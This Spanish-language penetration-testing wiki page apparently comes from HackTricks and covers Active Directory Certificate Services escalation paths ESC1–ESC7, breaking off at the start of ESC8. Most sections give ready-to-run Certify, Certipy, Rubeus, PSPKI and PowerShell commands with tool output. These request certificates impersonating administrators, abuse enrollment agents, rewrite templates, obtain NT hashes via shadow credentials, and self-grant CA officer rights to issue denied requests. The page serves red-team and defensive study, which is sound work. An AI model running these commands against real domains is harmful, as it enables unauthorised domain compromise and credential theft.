# Escalada de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este es un resumen de las secciones sobre técnicas de escalada de las publicaciones:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Plantillas de certificados mal configuradas - ESC1

### Explicación

### Explicación de las plantillas de certificados mal configuradas - ESC1

- **La CA empresarial concede derechos de inscripción a usuarios con pocos privilegios.**
- **No se requiere la aprobación de un administrador.**
- **No se necesitan firmas de personal autorizado.**
- **Los descriptores de seguridad de las plantillas de certificados son demasiado permisivos y permiten que usuarios con pocos privilegios obtengan derechos de inscripción.**
- **Las plantillas de certificados están configuradas para definir EKU que facilitan la autenticación:**
  - Se incluyen identificadores de uso extendido de clave (EKU), como Autenticación de cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de sesión con tarjeta inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier propósito (OID 2.5.29.37.0) o ningún EKU (SubCA).
- **La plantilla permite que quienes solicitan el certificado incluyan un subjectAltName en la solicitud de firma de certificado (CSR):**
  - Si está presente, Active Directory (AD) prioriza el subjectAltName (SAN) de un certificado para verificar la identidad. Esto significa que, al especificar el SAN en una CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un administrador de dominio). La posibilidad de que quien solicita el certificado especifique un SAN se indica en el objeto de AD de la plantilla de certificado mediante la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia de la marca `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que quien solicita el certificado especifique el SAN.

> [!CAUTION]
> Esta configuración identifica una plantilla candidata a ESC1, no una ruta de suplantación completada. Comprueba que la entidad de destino pueda inscribirse en una CA que publique la plantilla, que se permita la inscripción en la CA y que el certificado emitido cumpla las reglas estrictas de mapeo de SID del endpoint de autenticación. Los KDC actuales con los parches instalados pueden rechazar un UPN solicitado si el SID del certificado no coincide con el de destino; consulta la [guía de Microsoft sobre el mapeo de certificados](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Los derechos de inscripción concedidos a **Domain Computers** pueden hacer que una identidad de equipo preparada sea apta para la inscripción, incluso si el usuario original no puede inscribirse. Evalúa los derechos de la entidad de equipo por separado. Comprueba `msPKI-Minimal-Key-Size` antes de realizar una solicitud: una plantilla que requiere claves RSA de 4096 bits rechazará el valor predeterminado de 2048 bits del cliente. Un SID de destino proporcionado en la solicitud solo puede resolver una discrepancia de SID si la CA y el KDC aceptan el certificado resultante y su mapeo; ni las marcas de la plantilla ni una ACE de Enroll lo demuestran por sí solas.

Esta función a veces se habilita para permitir la generación sobre la marcha de certificados HTTPS o de host por parte de productos o servicios de implementación, o por falta de comprensión.

Cabe señalar que crear un certificado con esta opción activa una advertencia, lo que no ocurre cuando se duplica una plantilla de certificado existente (como la plantilla `WebServer`, que tiene habilitada la opción `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) y luego se modifica para incluir un OID de autenticación.<sup>[[6]](#references)</sup>

### Abuso

Para **encontrar plantillas de certificados vulnerables**, puedes ejecutar:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Para **abusar de esta vulnerabilidad y hacerse pasar por un administrador**, se podría ejecutar:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Luego puedes convertir el **certificado generado al formato `.pfx`** y usarlo para **autenticarte con Rubeus o certipy** de nuevo:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden usar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de las plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación ni firmas, que tienen un EKU de Client Authentication o Smart Card Logon y que tienen habilitado el flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, se puede realizar ejecutando la siguiente consulta LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Plantillas de certificados mal configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.
2. El requisito de aprobación del manager está deshabilitado.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad demasiado permisivo en la plantilla del certificado concede derechos de inscripción a usuarios con pocos privilegios.
5. **La plantilla del certificado está definida para incluir el EKU Any Purpose o ningún EKU.**

El **EKU Any Purpose** permite que un atacante obtenga un certificado para **cualquier propósito**, incluida la autenticación de cliente, la autenticación de servidor, la firma de código, etc. Se puede emplear la misma **técnica utilizada para ESC3** para explotar este escenario.

Los certificados **sin EKU**, que actúan como certificados de CA subordinada, pueden explotarse para **cualquier propósito** y **también pueden utilizarse para firmar certificados nuevos**. Por lo tanto, un atacante podría especificar EKU o campos arbitrarios en los certificados nuevos utilizando un certificado de CA subordinada.

Sin embargo, los certificados nuevos creados para la **autenticación de dominio** no funcionarán si la CA subordinada no es de confianza para el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. Aun así, un atacante puede crear **certificados nuevos con cualquier EKU** y valores de certificado arbitrarios. Estos podrían **aprovecharse** para una amplia variedad de propósitos (p. ej., firma de código, autenticación de servidor, etc.) y tener implicaciones importantes para otras aplicaciones de la red, como SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Para enumerar las plantillas que coinciden con este escenario en el esquema de configuración del bosque de AD, se puede ejecutar la siguiente consulta LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Plantillas de agente de inscripción mal configuradas - ESC3

### Explicación

Este escenario es similar al primero y al segundo, pero **abusa** de un **EKU diferente** (Certificate Request Agent) y de **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Enrollment Agent** en la documentación de Microsoft, permite que una entidad de seguridad **se inscriba** para obtener un **certificado** en **nombre de otro usuario**.

El **“Enrollment Agent”** se inscribe en una **plantilla** de este tipo y usa el **certificado resultante para firmar conjuntamente una CSR en nombre del otro usuario**. Luego **envía** la **CSR firmada conjuntamente** a la CA y se inscribe en una **plantilla** que **permite “inscribirse en nombre de”**; la CA responde con un **certificado que pertenece al “otro” usuario**.<sup>[[6]](#references)</sup>

**Requisitos 1:**

- La CA empresarial concede derechos de inscripción a usuarios con pocos privilegios.
- Se omite el requisito de aprobación del administrador.
- No se requieren firmas autorizadas.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo y concede derechos de inscripción a usuarios con pocos privilegios.
- La plantilla de certificado incluye el EKU Certificate Request Agent, que permite solicitar certificados de otras plantillas en nombre de otras entidades de seguridad.

**Requisitos 2:**

- La CA empresarial concede derechos de inscripción a usuarios con pocos privilegios.
- Se omite la aprobación del administrador.
- Una plantilla de destino de versión 1 puede aceptar un agente de inscripción sin los controles granulares más recientes de directivas de emisión; para la versión 2 o posterior, evalúa sus requisitos de emisión de directivas de aplicación y de firmas autorizadas, en lugar de excluir la plantilla solo por su versión.
- Un EKU definido en la plantilla de certificado permite la autenticación en el dominio.
- La CA no aplica restricciones a los agentes de inscripción.

La plantilla de destino también debe estar publicada por la CA elegida, permitir que la cuenta de destino se inscriba y admitir el uso previsto para la autenticación en el dominio. Comprueba los atributos requeridos de asunto/SAN en esa cuenta; por ejemplo, una plantilla que obtiene el correo electrónico del asunto desde AD no puede emitir un certificado para una cuenta que no tenga el valor `mail` requerido. Un certificado de agente por sí solo no satisface estos requisitos de la plantilla de destino.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Los **usuarios** a los que se permite **obtener** un **certificado de agente de inscripción**, las plantillas en las que los **agentes** de inscripción pueden inscribirse y las **cuentas** en nombre de las cuales puede actuar el agente de inscripción pueden estar restringidos por las CA empresariales. Esto se logra abriendo el **complemento** `certsrc.msc`, haciendo **clic con el botón derecho en la CA**, seleccionando **Propiedades** y, después, **navegando** a la pestaña “Agentes de inscripción”.

Sin embargo, cabe señalar que la configuración **predeterminada** de las CA es “**No restringir los agentes de inscripción**”. Cuando los administradores habilitan las restricciones para los agentes de inscripción seleccionando “Restringir los agentes de inscripción”, la configuración predeterminada sigue siendo extremadamente permisiva. Permite que **Everyone** se inscriba en todas las plantillas como cualquier usuario.

### PoCs de PowerShell solo para Windows con Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) ejecuta ESC1 y ESC2/ESC3 sin Certify ni Certipy. Sus scripts crean una clave RSA exportable de 2048 bits mediante la API COM `X509Enrollment`, generan una solicitud PKCS#10, buscan en LDAP el primer `pKIEnrollmentService`, la envían mediante `CertificateAuthority.Request`, instalan la respuesta en `Cert:\CurrentUser\My` y exportan un PFX codificado en Base64. El script de ESC1 añade un SAN UPN elegido por el atacante (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valor `0xb`), mientras que los scripts de ESC2/ESC3 usan el primer certificado para firmar una solicitud PKCS#7 en nombre de otro usuario.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Los scripts imprimen el Base64 del **PFX**, que incluye la clave privada, para usarlo directamente con Rubeus. No lo reemplaces por `[Convert]::ToBase64String($cert.RawData)`: `RawData` codifica únicamente el certificado público y no puede firmar la solicitud PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Control de acceso vulnerable a plantillas de certificados - ESC4

### **Explicación**

El **descriptor de seguridad** de las **plantillas de certificados** define los **permisos** que poseen los **principales de AD** sobre la plantilla.

Si un **atacante** posee los **permisos** necesarios para **alterar** una **plantilla** e **implementar** cualquiera de las **configuraciones incorrectas explotables** descritas en las **secciones anteriores**, podría facilitarse la escalada de privilegios.

Entre los permisos destacables aplicables a las plantillas de certificados se incluyen:<sup>[[6]](#references)</sup>

- **Owner:** Otorga control implícito sobre el objeto, lo que permite modificar cualquiera de sus atributos.
- **FullControl:** Permite autoridad total sobre el objeto, incluida la capacidad de modificar cualquiera de sus atributos.
- **WriteOwner:** Permite cambiar el propietario del objeto por un principal bajo el control del atacante.
- **WriteDacl:** Permite ajustar los controles de acceso, lo que podría otorgar FullControl a un atacante.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

Revisa también la DACL del contenedor `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Una ACE `CreateChild` aplicable y limitada a la clase [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), o el control total general, podría permitir crear un nuevo objeto de plantilla. [Microsoft documenta](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) que este contenedor alberga estos objetos de plantilla. Revisa las ACE de denegación coincidentes y la herencia antes de determinar si la creación es posible. Crear una plantilla no emite un certificado por sí solo: una CA debe publicarla, el principal que lo solicite necesita permisos de enrollment y el certificado debe asignarse a la identidad prevista en el endpoint de autenticación.

### Abuso

Para identificar principales con permisos de edición en plantillas y otros objetos PKI, enumera con Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Un ejemplo de un privesc como el anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto puede aprovecharse, por ejemplo, para sobrescribir la configuración de la plantilla y hacerla vulnerable a ESC1.

Una plantilla que permite al solicitante proporcionar el sujeto, pero que solo tiene el uso Server Authentication, no es por sí sola una plantilla de inicio de sesión de usuario. Con derechos efectivos de control sobre la plantilla, un atacante podría cambiar sus EKU de autenticación o sus políticas de aplicación antes de solicitar un certificado; [Microsoft documenta el propósito de inicio de sesión de la EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Verifica que una CA publique la plantilla modificada, que el solicitante pueda inscribirse, que se cumplan los requisitos de aprobación/firma y que el certificado emitido se asocie a la cuenta prevista. En particular, [los controladores de dominio con parches y en modo Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rechazan certificados sin strong mapping; añadir un UPN de destino a una solicitud no evita ese requisito.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene la nueva arista `AddKeyCredentialLink` hacia `JOHNPC`. Como esta técnica está relacionada con los certificados, también he implementado este ataque, conocido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Aquí tienes un pequeño adelanto del comando `shadow auto` de Certipy para obtener el hash NT de la víctima.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. De forma **predeterminada**, Certipy **sobrescribirá** la configuración para que sea **vulnerable a ESC1**. También podemos especificar el parámetro **`-save-old` para guardar la configuración anterior**, lo que será útil para **restaurar** la configuración después del ataque.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Control de acceso a objetos PKI vulnerables - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos además de las plantillas de certificados y la autoridad de certificación, puede afectar a la seguridad de todo el sistema AD CS. Entre estos objetos, que pueden afectar significativamente a la seguridad, se encuentran:

- El objeto de equipo de AD del servidor de CA, que puede verse comprometido mediante mecanismos como S4U2Self o S4U2Proxy.
- El servidor RPC/DCOM del servidor de CA.
- Cualquier objeto o contenedor descendiente de AD dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, entre otros, contenedores y objetos como el contenedor Certificate Templates, el contenedor Certification Authorities, el objeto NTAuthCertificates y el contenedor Enrollment Services.

La seguridad del sistema PKI puede verse comprometida si un atacante con pocos privilegios consigue tomar el control de cualquiera de estos componentes críticos.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema abordado en la [**publicación de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también trata las implicaciones del indicador **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, tal como las describe Microsoft. Cuando esta configuración está activada en una autoridad de certificación (CA), permite incluir **valores definidos por el usuario** en el **nombre alternativo del sujeto** para **cualquier solicitud**, incluidas las creadas a partir de Active Directory®. En consecuencia, esta configuración permite que un **intruso** se inscriba mediante **cualquier plantilla** configurada para la **autenticación** de dominio, en concreto, las que permiten la inscripción a usuarios **sin privilegios**, como la plantilla User estándar. Así, se puede obtener un certificado que permita al intruso autenticarse como administrador del dominio o como **cualquier otra entidad activa** del dominio.<sup>[[9]](#references)</sup>

**Nota**: El método para añadir **nombres alternativos** a una solicitud de firma de certificado (CSR) mediante el argumento `-attrib "SAN:"` de `certreq.exe` (denominado “Name Value Pairs”) **difiere** de la estrategia de explotación de SAN de ESC1. La diferencia está en **cómo se encapsula la información de la cuenta**: en un atributo del certificado, en lugar de en una extensión.

### Explotación

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Esta operación emplea esencialmente el **acceso remoto al registro**, por lo que un enfoque alternativo podría ser:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar esta configuración incorrecta y explotarla:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Para modificar estos ajustes, suponiendo que se tienen derechos de **administrador del dominio** o equivalentes, se puede ejecutar el siguiente comando desde cualquier estación de trabajo:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Para deshabilitar esta configuración en tu entorno, se puede eliminar el flag con:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Después de las actualizaciones de seguridad de mayo de 2022, los **certificados** recién emitidos contendrán una **extensión de seguridad** que incorpora la propiedad `objectSid` del **solicitante**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el `objectSid` del **solicitante**, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea vulnerable a ESC10 (Weak Certificate Mappings), que prioriza el **SAN por encima de la nueva extensión de seguridad**.

## Control de acceso vulnerable de la entidad de certificación - ESC7

### Ataque 1

#### Explicación

El control de acceso de una entidad de certificación se mantiene mediante un conjunto de permisos que rigen las acciones de la CA. Estos permisos se pueden consultar accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando las propiedades y, luego, yendo a la pestaña Security. Además, los permisos se pueden enumerar mediante el módulo PSPKI con comandos como:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Esto proporciona información sobre los permisos principales, concretamente **`ManageCA`** y **`ManageCertificates`**, que corresponden a los roles de «administrador de CA» y «administrador de certificados», respectivamente.<sup>[[6]](#references)</sup>

#### Abuso

Tener permisos **`ManageCA`** en una autoridad certificadora permite al principal manipular la configuración de forma remota mediante PSPKI. Esto incluye activar el indicador **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir especificar SAN en cualquier plantilla, un aspecto fundamental de la escalada de dominio.

Este proceso se puede simplificar con el cmdlet **Enable-PolicyModuleFlag** de PSPKI, que permite realizar modificaciones sin interactuar directamente con la GUI.

Tener permisos **`ManageCertificates`** facilita aprobar solicitudes pendientes y, en la práctica, eludir la protección «aprobación del administrador de certificados de CA».

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explicación

> [!WARNING]
> En el **ataque anterior** se usaron permisos **`Manage CA`** para **habilitar** el flag **EDITF_ATTRIBUTESUBJECTALTNAME2** y realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que se reinicie el servicio de CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso `Manage CA`, también puede **reiniciar el servicio**. Sin embargo, esto **no significa que pueda reiniciarlo de forma remota**. Además, es posible que **ESC6 no funcione de forma inmediata** en la mayoría de los entornos con parches, debido a las actualizaciones de seguridad de mayo de 2022.

Por lo tanto, aquí se presenta otro ataque.

Requisitos previos:

- Solo permiso **`ManageCA`**
- Permiso **`Manage Certificates`** (se puede conceder desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **habilitada** (se puede habilitar desde **`ManageCA`**)

La técnica se basa en que los usuarios con los derechos de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificados fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en ella. Por lo tanto, un **usuario** puede **solicitar** inscribirse en **`SubCA`** —lo que será **denegado**— y luego el administrador la **emitirá**.<sup>[[6]](#references)</sup>

#### Abuso

Puedes **concederte el derecho de acceso `Manage Certificates`** agregando tu usuario como nuevo oficial.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

La plantilla **`SubCA`** se puede **habilitar en la CA** con el parámetro `-enable-template`. De forma predeterminada, la plantilla `SubCA` está habilitada.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Si hemos cumplido los requisitos previos para este ataque, podemos empezar **solicitando un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denega**da, pero guardaremos la clave privada y anotaremos el ID de solicitud.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Con nuestros **`Manage CA` y `Manage Certificates`**, podemos **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Y, por último, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Ataque 3 – Abuso de la extensión Manage Certificates (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló una primitiva completamente nueva que solo requiere el rol *Manage Certificates* (también conocido como **Certificate Manager / Officer**) en la CA empresarial.<sup>[[3]](#references)</sup>

Cualquier principal que tenga *Manage Certificates* puede ejecutar el método RPC `ICertAdmin::SetExtension`. Aunque tradicionalmente las CA legítimas usaban este método para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **añadir una extensión de certificado *no predeterminada*** (por ejemplo, un OID personalizado de *Certificate Issuance Policy*, como `1.1.1.1`) a una solicitud pendiente de aprobación.

Como la plantilla objetivo **no define un valor predeterminado para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando finalmente se emita el certificado. Por lo tanto, el certificado resultante contiene una extensión elegida por el atacante que puede:

* Cumplir los requisitos de Application / Issuance Policy de otras plantillas vulnerables (lo que conduce a una escalada de privilegios).
* Inyectar EKU o políticas adicionales que otorguen al certificado una confianza inesperada en sistemas de terceros.

En resumen, *Manage Certificates* —que antes se consideraba la opción «menos poderosa» de ESC7— ahora puede aprovecharse para lograr una escalada de privilegios completa o persistencia a largo plazo, sin modificar la configuración de la CA ni requerir el derecho más restrictivo *Manage CA*.

#### Abusar de la primitiva con Certify 2.0

1. **Enviar una solicitud de certificado que quede *pendiente*.** Esto se puede forzar con una plantilla que requiera la aprobación de un administrador:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Anexa una extensión personalizada a la solicitud pendiente** usando el nuevo comando `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Si la plantilla no define ya la extensión *Certificate Issuance Policies*, el valor anterior se conservará después de la emisión.*

3. **Emite la solicitud** (si tu rol también tiene derechos de aprobación de *Manage Certificates*) o espera a que un operador la apruebe. Una vez emitido, descarga el certificado:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. El certificado resultante ahora contiene el OID de política de emisión malicioso y puede usarse en ataques posteriores (p. ej., ESC13, escalada de dominio, etc.).

> NOTE: El mismo ataque puede ejecutarse con Certipy ≥ 4.7 mediante el comando `ca` y el parámetro `-set-extension`.

## NTLM Relay a endpoints HTTP de AD CS – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **endpoint de inscripción web vulnerable** y hay publicada al menos una **plantilla de certificado** que permite la **inscripción de equipos del dominio y la autenticación de cliente** (como la plantilla predeterminada **`Machine`**), ¡un atacante puede comprometer **cualquier equipo que tenga activo el servicio de spooler**!

AD CS admite varios **métodos de inscripción basados en HTTP**, disponibles mediante roles de servidor adicionales que los administradores pueden instalar. Estas interfaces para la inscripción de certificados basada en HTTP son vulnerables a **ataques NTLM relay**. Desde una **máquina comprometida, un atacante puede suplantar cualquier cuenta de AD que se autentique mediante NTLM entrante**. Mientras suplanta la cuenta de la víctima, un atacante puede acceder a estas interfaces web para **solicitar un certificado de autenticación de cliente usando las plantillas de certificado `User` o `Machine`**.

